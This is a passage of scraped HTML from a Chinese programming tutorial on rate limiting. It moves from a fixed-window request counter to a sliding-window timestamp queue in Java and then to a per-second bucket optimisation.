data-annotation-key="gkann_7031583905" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span 
data-slate-string="true">boolean</span></span></span></span><span data-slate-leaf="true" data-offset-key="1926:4"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_4534195230" 
data-annotation-type="annotation"><span data-slate-string="true"> </span></span></span><span 
data-slate-leaf="true" data-offset-key="1926:5"><span class=" gkhl-title" data-slate-object="annotation" 
data-annotation-key="gkann_7583830113" data-annotation-type="annotation"><span class=" gkhl-function" 
data-slate-object="annotation" data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span 
data-slate-string="true">isAllowed</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1926:6"><span class=" gkhl-params" data-slate-object="annotation" data-annotation-key="gkann_3781233035" 
data-annotation-type="annotation"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1926:7"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_4534195230" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1926:8"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1927"> <span data-slate-object="text" data-key="1928"><span data-slate-leaf="true" 
data-offset-key="1928:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1928:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_3447213492" data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="1928:2"><span data-slate-string="true"> now = System.currentTimeMillis();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1929"> <span data-slate-object="text" data-key="1930"><span data-slate-leaf="true" 
data-offset-key="1930:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1930:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5247138941" data-annotation-type="annotation"><span data-slate-string="true">if</span></span></span><span 
data-slate-leaf="true" data-offset-key="1930:2"><span data-slate-string="true"> (now-start 
&gt; </span></span><span data-slate-leaf="true" data-offset-key="1930:3"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_9289937905" data-annotation-type="annotation"><span 
data-slate-string="true">60</span></span></span><span data-slate-leaf="true" data-offset-key="1930:4"><span 
data-slate-string="true">*</span></span><span data-slate-leaf="true" data-offset-key="1930:5"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_6629364189" 
data-annotation-type="annotation"><span data-slate-string="true">1000</span></span></span><span 
data-slate-leaf="true" data-offset-key="1930:6"><span data-slate-string="true">) {</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1931"> <span data-slate-object="text" data-key="1932"><span data-slate-leaf="true" 
data-offset-key="1932:0" data-first-offset="true"><span data-slate-string="true"> start = now 
- (now-start)%(</span></span><span data-slate-leaf="true" data-offset-key="1932:1"><span class=" 
gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_3098017075" data-annotation-type="annotation"><span 
data-slate-string="true">60</span></span></span><span data-slate-leaf="true" data-offset-key="1932:2"><span 
data-slate-string="true">*</span></span><span data-slate-leaf="true" data-offset-key="1932:3"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_7260110123" 
data-annotation-type="annotation"><span data-slate-string="true">1000</span></span></span><span 
data-slate-leaf="true" data-offset-key="1932:4"><span data-slate-string="true">); </span></span><span 
data-slate-leaf="true" data-offset-key="1932:5"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_3789160889" data-annotation-type="annotation"><span data-slate-string="true">// 
所在时间窗口的起始位置</span></span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1933"> <span data-slate-object="text" data-key="1934"><span 
data-slate-leaf="true" data-offset-key="1934:0" data-first-offset="true"><span data-slate-string="true"> 
count = </span></span><span data-slate-leaf="true" data-offset-key="1934:1"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_5580981693" data-annotation-type="annotation"><span 
data-slate-string="true">0</span></span></span><span data-slate-leaf="true" data-offset-key="1934:2"><span 
data-slate-string="true">;</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1935"> <span data-slate-object="text" 
data-key="1936"><span data-slate-leaf="true" data-offset-key="1936:0" data-first-offset="true"><span 
data-slate-string="true"> }</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1937"> <span data-slate-object="text" 
data-key="1938"><span data-slate-leaf="true" data-offset-key="1938:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1939"> <span data-slate-object="text" 
data-key="1940"><span data-slate-leaf="true" data-offset-key="1940:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1940:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_0233043457" 
data-annotation-type="annotation"><span data-slate-string="true">if</span></span></span><span 
data-slate-leaf="true" data-offset-key="1940:2"><span data-slate-string="true"> (count &lt; 
</span></span><span data-slate-leaf="true" data-offset-key="1940:3"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_4688712315" data-annotation-type="annotation"><span 
data-slate-string="true">10000</span></span></span><span data-slate-leaf="true" data-offset-key="1940:4"><span 
data-slate-string="true">) {</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1941"> <span data-slate-object="text" 
data-key="1942"><span data-slate-leaf="true" data-offset-key="1942:0" data-first-offset="true"><span 
data-slate-string="true"> count++;</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1943"> <span data-slate-object="text" 
data-key="1944"><span data-slate-leaf="true" data-offset-key="1944:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1944:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7579753185" 
data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="1944:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1944:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0584623544" data-annotation-type="annotation"><span data-slate-string="true">true</span></span></span><span 
data-slate-leaf="true" data-offset-key="1944:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1945"> <span data-slate-object="text" data-key="1946"><span data-slate-leaf="true" 
data-offset-key="1946:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1947"> <span data-slate-object="text" data-key="1948"><span data-slate-leaf="true" 
data-offset-key="1948:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1948:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_0981634958" data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="1948:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1948:3"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_7401628015" data-annotation-type="annotation"><span data-slate-string="true">false</span></span></span><span 
data-slate-leaf="true" data-offset-key="1948:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1949"> <span data-slate-object="text" data-key="1950"><span data-slate-leaf="true" 
data-offset-key="1950:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1951"> <span data-slate-object="text" data-key="1952"><span data-slate-leaf="true" 
data-offset-key="1952:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 243px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-f6860412 " data-slate-type="paragraph" data-slate-object="block" 
data-key="1953"> <span data-slate-object="text" data-key="1954"><span data-slate-leaf="true" 
data-offset-key="1954:0" data-first-offset="true"><span data-slate-string="true">这样这个问题似乎就得到了解决。</span></span></span><span 
data-slate-object="text" data-key="1955"><span data-slate-leaf="true" data-offset-key="1955:0" 
data-first-offset="true"><span class="se-768fb857" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">可是，刚才我们在解决问题的时候，似乎“擅自”强化了一个条件……</span></span></span></span> </div> 
<h3 class="se-081c7bda" data-slate-type="heading" data-slate-object="block" data-key="1956"><span 
data-slate-object="text" data-key="1957"><span data-slate-leaf="true" data-offset-key="1957:0" 
data-first-offset="true"><span data-slate-string="true">从固定窗口到滑动窗口</span></span></span></h3> 
<div class="se-3fa50e09 " data-slate-type="paragraph" data-slate-object="block" data-key="1958"> 
<span data-slate-object="text" data-key="1959"><span data-slate-leaf="true" data-offset-key="1959:0" 
data-first-offset="true"><span data-slate-string="true">这个条件就是“固定时间窗口”。</span></span></span> 
</div> <div class="se-532dad1b " data-slate-type="paragraph" data-slate-object="block" data-key="1960"> 
<span data-slate-object="text" data-key="1961"><span data-slate-leaf="true" data-offset-key="1961:0" 
data-first-offset="true"><span data-slate-string="true">举个例子，从 3:00 到 3:01 这一分钟时间内，假如系统收到了 
9000 个请求，而在 3:01 到 3:02 这接着的一分钟内，系统也收到了 9000 个请求，二者都满足要求。但是，这是我们给了一个假定的增强条件——固定时间窗口，而得到的结论。</span></span></span> 
</div> <div class="se-7fc90586 " data-slate-type="paragraph" data-slate-object="block" data-key="1962"> 
<span data-slate-object="text" data-key="1963"><span data-slate-leaf="true" data-offset-key="1963:0" 
data-first-offset="true"><span data-slate-string="true">假如说前面这 9000 个请求都分布在 3:00:30 到 3:01:00 
之间，后面这 9000 个请求都分布在 3:01:00 到 3:01:30 之间，即从 3 点 00 分 30 秒 到 3 点 01 分 30 秒这一分钟内，系统居然接纳了 9000 
+ 9000 = 18000 个请求。因此，如果我们考虑的是“滑动时间窗口”，这显然违背了我们的每分钟一万次最大请求量的规则。请看下图：</span></span></span> </div> 
<div class="se-89b3eceb" data-slate-type="image" data-slate-object="block" data-key="1964"> 
<img class="se-192415c0" src="https://static001.geekbang.org/resource/image/2d/1b/2d376db8e707852fc10d21530837fa1b.png"> 
</div> <div class="se-3f44c20f " data-slate-type="paragraph" data-slate-object="block" data-key="1965"> 
<span data-slate-object="text" data-key="1966"><span data-slate-leaf="true" data-offset-key="1966:0" 
data-first-offset="true"><span data-slate-string="true">因此，相较来说，更实际的情况下，我们是要支持滑动时间窗口，也就是任意一分钟的时间窗口内，都要满足小于 
10000 请求量的规则。看来，简单计数法需要改进。</span></span></span> </div> <h3 class="se-c156298f" data-slate-type="heading" 
data-slate-object="block" data-key="1967"><span data-slate-object="text" data-key="1968"><span 
data-slate-leaf="true" data-offset-key="1968:0" data-first-offset="true"><span data-slate-string="true">时间队列</span></span></span></h3> 
<div class="se-1a8b3096 " data-slate-type="paragraph" data-slate-object="block" data-key="1969"> 
<span data-slate-object="text" data-key="1970"><span data-slate-leaf="true" data-offset-key="1970:0" 
data-first-offset="true"><span class="se-dcd2a0a0" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">对于滑动窗口的问题，我们经常要引入队列来解决问题。</span></span></span></span><span data-slate-object="text" 
data-key="1971"><span data-slate-leaf="true" data-offset-key="1971:0" data-first-offset="true"><span 
data-slate-string="true">因为队列的特点是先进先出，一头进，另一头出，而很多滑动窗口的问题，恰恰需要这个特性，这个问题也不例外。</span></span></span> 
</div> <div class="se-478e1879 " data-slate-type="paragraph" data-slate-object="block" data-key="1972"> 
<span data-slate-object="text" data-key="1973"><span data-slate-leaf="true" data-offset-key="1973:0" 
data-first-offset="true"><span data-slate-string="true">假如我们维护一个最近时间戳的队列，这个队列长度不能超过 10000，那么，当新的请求到来的时候，我们只需要找到从“当前时间减 
1 分钟”到“当前时间”这样一个滑动窗口区间。如果队列的尾部有任何存储的时间戳在这个区间之外（一分钟以前），那我们就把它从队列中拿掉。如果队列长度小于 10000，那么这个新的请求的时间戳就可以入队列，允许请求访问；反之，则不允许请求访问。请看下图：</span></span></span> 
</div> <div class="se-0c888939" data-slate-type="image" data-slate-object="block" data-key="1974"> 
<img class="se-2875e822" src="https://static001.geekbang.org/resource/image/80/e0/8002fa4ef1491a6ec8fd32d504e9bae0.png"> 
</div> <div class="se-901b2c82 " data-slate-type="paragraph" data-slate-object="block" data-key="1975"> 
<span data-slate-object="text" data-key="1976"><span data-slate-leaf="true" data-offset-key="1976:0" 
data-first-offset="true"><span data-slate-string="true">这个过程，参考代码如下：</span></span></span> </div> 
<div class="se-1debc909 se-21ff4957" data-slate-type="pre" data-slate-object="block" data-key="1977" 
data-code-language="cpp"> <div class="se-cf5b8ab1 se-b9b59ec4"> <span></span> </div> <div class="se-2bccab69"> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="1"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="2"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="3"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="4"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="5"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="6"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="7"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="8"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="9"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="10"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="11"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="12"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="13"></div> <div class="se-a25fbae2 
se-1a9b5768" data-code-line-number="14"></div> <div class="se-a25fbae2 se-1a9b5768" data-code-line-number="15"></div> 
<div class="se-a25fbae2 se-1a9b5768" data-code-line-number="16"></div> </div> <div class="se-28efa360 
ps ps--active-x"> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1978"> <span data-slate-object="text" data-key="1979"><span data-slate-leaf="true" 
data-offset-key="1979:0" data-first-offset="true"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5791910948" data-annotation-type="annotation"><span data-slate-string="true">public</span></span></span><span 
data-slate-leaf="true" data-offset-key="1979:1"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1979:2"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5385416722" data-annotation-type="annotation"><span class=" gkhl-class" 
data-slate-object="annotation" data-annotation-key="gkann_1394708803" data-annotation-type="annotation"><span 
data-slate-string="true">class</span></span></span></span><span data-slate-leaf="true" data-offset-key="1979:3"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_1394708803" data-annotation-type="annotation"><span 
data-slate-string="true"> </span></span></span><span data-slate-leaf="true" data-offset-key="1979:4"><span 
class=" gkhl-title" data-slate-object="annotation" data-annotation-key="gkann_9240620701" data-annotation-type="annotation"><span 
class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_1394708803" data-annotation-type="annotation"><span 
data-slate-string="true">RateLimiter</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1979:5"><span class=" gkhl-class" data-slate-object="annotation" data-annotation-key="gkann_1394708803" 
data-annotation-type="annotation"><span data-slate-string="true"> {</span></span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1980"> <span data-slate-object="text" data-key="1981"><span data-slate-leaf="true" 
data-offset-key="1981:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1981:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8852669608" data-annotation-type="annotation"><span data-slate-string="true">private</span></span></span><span 
data-slate-leaf="true" data-offset-key="1981:2"><span data-slate-string="true"> Queue&lt;Long&gt; 
</span></span><span data-slate-leaf="true" data-offset-key="1981:3"><span class=" gkhl-built_in" 
data-slate-object="annotation" data-annotation-key="gkann_1666523551" data-annotation-type="annotation"><span 
data-slate-string="true">queue</span></span></span><span data-slate-leaf="true" data-offset-key="1981:4"><span 
data-slate-string="true"> = </span></span><span data-slate-leaf="true" data-offset-key="1981:5"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_7384714456" 
data-annotation-type="annotation"><span data-slate-string="true">new</span></span></span><span 
data-slate-leaf="true" data-offset-key="1981:6"><span data-slate-string="true"> LinkedList&lt;&gt;();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1982"> <span data-slate-object="text" data-key="1983"><span data-slate-leaf="true" 
data-offset-key="1983:0" data-first-offset="true"><span data-slate-string="true"> </span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1984"> <span data-slate-object="text" data-key="1985"><span data-slate-leaf="true" 
data-offset-key="1985:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1985:1"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7892266872" data-annotation-type="annotation"><span class=" gkhl-keyword" 
data-slate-object="annotation" data-annotation-key="gkann_8897533932" data-annotation-type="annotation"><span 
data-slate-string="true">public</span></span></span></span><span data-slate-leaf="true" data-offset-key="1985:2"><span 
class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7892266872" 
data-annotation-type="annotation"><span data-slate-string="true"> boolean </span></span></span><span 
data-slate-leaf="true" data-offset-key="1985:3"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7892266872" data-annotation-type="annotation"><span class=" gkhl-title" 
data-slate-object="annotation" data-annotation-key="gkann_6355927646" data-annotation-type="annotation"><span 
data-slate-string="true">isAllowed</span></span></span></span><span data-slate-leaf="true" 
data-offset-key="1985:4"><span class=" gkhl-function" data-slate-object="annotation" data-annotation-key="gkann_7892266872" 
data-annotation-type="annotation"><span class=" gkhl-params" data-slate-object="annotation" 
data-annotation-key="gkann_4278459909" data-annotation-type="annotation"><span data-slate-string="true">()</span></span></span></span><span 
data-slate-leaf="true" data-offset-key="1985:5"><span class=" gkhl-function" data-slate-object="annotation" 
data-annotation-key="gkann_7892266872" data-annotation-type="annotation"><span data-slate-string="true"> 
</span></span></span><span data-slate-leaf="true" data-offset-key="1985:6"><span data-slate-string="true">{</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1986"> <span data-slate-object="text" data-key="1987"><span data-slate-leaf="true" 
data-offset-key="1987:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1987:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_4143104106" data-annotation-type="annotation"><span data-slate-string="true">long</span></span></span><span 
data-slate-leaf="true" data-offset-key="1987:2"><span data-slate-string="true"> now = System.currentTimeMillis();</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1988"> <span data-slate-object="text" data-key="1989"><span data-slate-leaf="true" 
data-offset-key="1989:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1989:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_1758033121" data-annotation-type="annotation"><span data-slate-string="true">while</span></span></span><span 
data-slate-leaf="true" data-offset-key="1989:2"><span data-slate-string="true"> (!</span></span><span 
data-slate-leaf="true" data-offset-key="1989:3"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_8317865210" data-annotation-type="annotation"><span data-slate-string="true">queue</span></span></span><span 
data-slate-leaf="true" data-offset-key="1989:4"><span data-slate-string="true">.isEmpty() &amp;&amp; 
</span></span><span data-slate-leaf="true" data-offset-key="1989:5"><span class=" gkhl-built_in" 
data-slate-object="annotation" data-annotation-key="gkann_6874556576" data-annotation-type="annotation"><span 
data-slate-string="true">queue</span></span></span><span data-slate-leaf="true" data-offset-key="1989:6"><span 
data-slate-string="true">.peek() &lt; now</span></span><span data-slate-leaf="true" data-offset-key="1989:7"><span 
class=" gkhl-number" data-slate-object="annotation" data-annotation-key="gkann_8989623835" 
data-annotation-type="annotation"><span data-slate-string="true">-60</span></span></span><span 
data-slate-leaf="true" data-offset-key="1989:8"><span data-slate-string="true">*</span></span><span 
data-slate-leaf="true" data-offset-key="1989:9"><span class=" gkhl-number" data-slate-object="annotation" 
data-annotation-key="gkann_1995711320" data-annotation-type="annotation"><span data-slate-string="true">1000</span></span></span><span 
data-slate-leaf="true" data-offset-key="1989:10"><span data-slate-string="true">) {</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="1990"> <span data-slate-object="text" data-key="1991"><span data-slate-leaf="true" 
data-offset-key="1991:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="1991:1"><span class=" gkhl-comment" data-slate-object="annotation" 
data-annotation-key="gkann_0340163379" data-annotation-type="annotation"><span data-slate-string="true">// 
如果请求已经是在一分钟以前了，忽略</span></span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" 
data-slate-object="block" data-key="1992"> <span data-slate-object="text" data-key="1993"><span 
data-slate-leaf="true" data-offset-key="1993:0" data-first-offset="true"><span data-slate-string="true"> 
</span></span><span data-slate-leaf="true" data-offset-key="1993:1"><span class=" gkhl-built_in" 
data-slate-object="annotation" data-annotation-key="gkann_7188099805" data-annotation-type="annotation"><span 
data-slate-string="true">queue</span></span></span><span data-slate-leaf="true" data-offset-key="1993:2"><span 
data-slate-string="true">.remove();</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1994"> <span data-slate-object="text" 
data-key="1995"><span data-slate-leaf="true" data-offset-key="1995:0" data-first-offset="true"><span 
data-slate-string="true"> }</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1996"> <span data-slate-object="text" 
data-key="1997"><span data-slate-leaf="true" data-offset-key="1997:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1997:1"><span 
class=" gkhl-keyword" data-slate-object="annotation" data-annotation-key="gkann_4949080703" 
data-annotation-type="annotation"><span data-slate-string="true">if</span></span></span><span 
data-slate-leaf="true" data-offset-key="1997:2"><span data-slate-string="true"> (</span></span><span 
data-slate-leaf="true" data-offset-key="1997:3"><span class=" gkhl-built_in" data-slate-object="annotation" 
data-annotation-key="gkann_5364249026" data-annotation-type="annotation"><span data-slate-string="true">queue</span></span></span><span 
data-slate-leaf="true" data-offset-key="1997:4"><span data-slate-string="true">.size() &lt; 
</span></span><span data-slate-leaf="true" data-offset-key="1997:5"><span class=" gkhl-number" 
data-slate-object="annotation" data-annotation-key="gkann_4800302325" data-annotation-type="annotation"><span 
data-slate-string="true">10000</span></span></span><span data-slate-leaf="true" data-offset-key="1997:6"><span 
data-slate-string="true">) {</span></span></span> </div> <div class="se-d15b7025 se-7e1f828d" 
data-slate-type="code-line" data-slate-object="block" data-key="1998"> <span data-slate-object="text" 
data-key="1999"><span data-slate-leaf="true" data-offset-key="1999:0" data-first-offset="true"><span 
data-slate-string="true"> </span></span><span data-slate-leaf="true" data-offset-key="1999:1"><span 
class=" gkhl-built_in" data-slate-object="annotation" data-annotation-key="gkann_7035310563" 
data-annotation-type="annotation"><span data-slate-string="true">queue</span></span></span><span 
data-slate-leaf="true" data-offset-key="1999:2"><span data-slate-string="true">.add(now);</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2000"> <span data-slate-object="text" data-key="2001"><span data-slate-leaf="true" 
data-offset-key="2001:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2001:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_8167969990" data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="2001:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2001:3"><span class=" gkhl-literal" data-slate-object="annotation" 
data-annotation-key="gkann_4189930925" data-annotation-type="annotation"><span data-slate-string="true">true</span></span></span><span 
data-slate-leaf="true" data-offset-key="2001:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2002"> <span data-slate-object="text" data-key="2003"><span data-slate-leaf="true" 
data-offset-key="2003:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2004"> <span data-slate-object="text" data-key="2005"><span data-slate-leaf="true" 
data-offset-key="2005:0" data-first-offset="true"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2005:1"><span class=" gkhl-keyword" data-slate-object="annotation" 
data-annotation-key="gkann_5156467138" data-annotation-type="annotation"><span data-slate-string="true">return</span></span></span><span 
data-slate-leaf="true" data-offset-key="2005:2"><span data-slate-string="true"> </span></span><span 
data-slate-leaf="true" data-offset-key="2005:3"><span class=" gkhl-literal" data-slate-object="annotation" 
data-annotation-key="gkann_0271244119" data-annotation-type="annotation"><span data-slate-string="true">false</span></span></span><span 
data-slate-leaf="true" data-offset-key="2005:4"><span data-slate-string="true">;</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2006"> <span data-slate-object="text" data-key="2007"><span data-slate-leaf="true" 
data-offset-key="2007:0" data-first-offset="true"><span data-slate-string="true"> }</span></span></span> 
</div> <div class="se-d15b7025 se-7e1f828d" data-slate-type="code-line" data-slate-object="block" 
data-key="2008"> <span data-slate-object="text" data-key="2009"><span data-slate-leaf="true" 
data-offset-key="2009:0" data-first-offset="true"><span data-slate-string="true">}</span></span></span> 
</div> <div class="ps__rail-x" style="width: 365px; left: 0px; bottom: 0px;"> <div class="ps__thumb-x" 
tabindex="0" style="left: 0px; width: 266px;"></div> </div> <div class="ps__rail-y" style="top: 
0px; right: 0px;"> <div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div> 
</div> </div> </div> <div class="se-310f3cdf " data-slate-type="paragraph" data-slate-object="block" 
data-key="2010"> <span data-slate-object="text" data-key="2011"><span data-slate-leaf="true" 
data-offset-key="2011:0" data-first-offset="true"><span data-slate-string="true">你可以看到，这个算法从时间消耗上看，颇为高效，但是在支持滑动窗口的同时，我们也能看到，付出的代价是一个数量级上相当于窗口宽度的空间复杂度，其实它就是这个队列的空间消耗，在这里队列最大长度就是 
10000。</span></span></span> </div> <div class="se-d18f6e8f " data-slate-type="paragraph" data-slate-object="block" 
data-key="2012"> <span data-slate-object="text" data-key="2013"><span data-slate-leaf="true" 
data-offset-key="2013:0" data-first-offset="true"><span data-slate-string="true">如果我们允许队列的长度较大，队列造成的空间消耗和单个处理请求的最大时间消耗就可能会成为问题，我们能优化一下吗？</span></span></span> 
</div> <div class="se-440deede " data-slate-type="paragraph" data-slate-object="block" data-key="2014"> 
<span data-slate-object="text" data-key="2015"><span data-slate-leaf="true" data-offset-key="2015:0" 
data-first-offset="true"><span data-slate-string="true">能。那么这种情况下，</span></span></span><span 
data-slate-object="text" data-key="2016"><span data-slate-leaf="true" data-offset-key="2016:0" 
data-first-offset="true"><span class="se-c979f6c2" data-slate-type="bold" data-slate-object="mark"><span 
data-slate-string="true">一种“妥协”的办法就是，队列中的每个元素，不再是实际请求精确到毫秒的时间戳，而是特定某一秒中包含的请求数目</span></span></span></span><span 
data-slate-object="text" data-key="2017"><span data-slate-leaf="true" data-offset-key="2017:0" 
data-first-offset="true"><span data-slate-string="true">，比如队列的其中一个元素表示 3:00:01 到 3:00:02 之间对应有 
150 个请求。用这种方法，对于上述这个一分钟内流量限制的问题，我们可以把队列长度严格控制在 60（因为是 60 秒），每个元素都表示特定某一秒中的请求数目。当然，这个方法损失的是时间窗口毫秒级的精度。而这，就是我们控制时间窗口队列的长度所采用的一种较为常见的优化方式，它虽</span></span></span><span 
data-slate-object="text" data-key="2018"><span data-slate-leaf="true" data-offset-key="2018:0" 
